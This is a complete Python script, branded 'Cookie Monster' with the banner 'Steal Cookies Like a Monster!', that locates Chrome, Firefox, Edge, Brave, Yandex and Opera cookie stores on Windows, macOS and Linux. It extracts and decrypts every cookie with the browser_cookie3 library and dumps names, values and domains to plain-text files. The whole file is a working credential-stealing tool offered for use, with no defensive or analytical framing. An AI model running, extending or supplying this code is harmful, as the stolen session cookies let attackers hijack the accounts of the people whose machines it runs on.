import os
import sys
import browser_cookie3
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

def print_banner():
    banner = r"""
    ╔═╗┌─┐┌─┐┬┌─┬┌─┐  ╔╦╗┌─┐┌┐┌┌─┐┌┬┐┌─┐┬─┐
    ║  │ ││ │├┴┐│├┤   ║║║│ ││││└─┐ │ ├┤ ├┬┘
    ╚═╝└─┘└─┘┴ ┴┴└─┘  ╩ ╩└─┘┘└┘└─┘ ┴ └─┘┴└─
    """
    print(Fore.CYAN + banner)
    print(Fore.YELLOW + "Steal Cookies Like a Monster!" + Style.RESET_ALL)

def find_installed_browsers():
    browsers = {}
    if sys.platform.startswith('win'):
        # Paths for different browsers
        browser_paths = {
            'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Cookies'),
            'Firefox': os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles'),
            'Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Default', 'Cookies'),
            'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Cookies'),
            'Yandex': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data', 'Default', 'Cookies'),
            'Opera': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable', 'Cookies'),
        }
    elif sys.platform.startswith('darwin'):
        browser_paths = {
            'Chrome': os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Cookies'),
            'Firefox': os.path.expanduser('~/Library/Application Support/Firefox/Profiles'),
            'Edge': os.path.expanduser('~/Library/Application Support/Microsoft Edge/Default/Cookies'),
            'Brave': os.path.expanduser('~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Cookies'),
            'Yandex': os.path.expanduser('~/Library/Application Support/Yandex/YandexBrowser/Default/Cookies'),
            'Opera': os.path.expanduser('~/Library/Application Support/com.operasoftware.Opera/Cookies'),
        }
    elif sys.platform.startswith('linux'):
        browser_paths = {
            'Chrome': os.path.expanduser('~/.config/google-chrome/Default/Cookies'),
            'Firefox': os.path.expanduser('~/.mozilla/firefox'),
            'Edge': os.path.expanduser('~/.config/microsoft-edge/Default/Cookies'),
            'Brave': os.path.expanduser('~/.config/BraveSoftware/Brave-Browser/Default/Cookies'),
            'Yandex': os.path.expanduser('~/.config/yandex-browser/Default/Cookies'),
            'Opera': os.path.expanduser('~/.config/opera/Cookies'),
        }

    for browser, path in browser_paths.items():
        if os.path.exists(path):
            if browser == 'Firefox':
                profiles = [os.path.join(path, profile) for profile in os.listdir(path)]
                browsers[browser] = profiles
            else:
                browsers[browser] = path

    return browsers

def get_cookies_from_browser(browser_name, browser_path):
    cookies = []
    try:
        if browser_name == 'Chrome':
            cookies = browser_cookie3.chrome()
        elif browser_name == 'Firefox':
            cookies = browser_cookie3.firefox()
        elif browser_name == 'Edge':
            cookies = browser_cookie3.edge()
        elif browser_name == 'Brave':
            cookies = browser_cookie3.brave()
        elif browser_name == 'Yandex':
            cookies = browser_cookie3.yandex()
        elif browser_name == 'Opera':
            cookies = browser_cookie3.opera()
    except Exception as e:
        print(Fore.RED + f"Error getting cookies for {browser_name}: {e}" + Style.RESET_ALL)

    return cookies

def save_cookies_as_text(browser_name, cookies):
    output_filename = f'{browser_name}_cookies.txt'
    with open(output_filename, 'w') as f:
        for cookie in cookies:
            cookie_info = (
                f"Name: {cookie.name}\n"
                f"Value: {cookie.value}\n"
                f"Domain: {cookie.domain}\n"
                f"Path: {cookie.path}\n"
                f"Expires: {cookie.expires}\n"
                f"{'-' * 40}\n"
            )
            f.write(cookie_info)
    print(Fore.GREEN + f'Saved cookies to {output_filename}' + Style.RESET_ALL)

def main():
    print_banner()
    browsers = find_installed_browsers()
    if not browsers:
        print(Fore.RED + "No supported browsers found." + Style.RESET_ALL)
        return

    for browser_name, browser_path in browsers.items():
        print(Fore.BLUE + f'Found {browser_name}.' + Style.RESET_ALL)
        cookies = get_cookies_from_browser(browser_name, browser_path)
        save_cookies_as_text(browser_name, cookies)

if __name__ == '__main__':
    main()
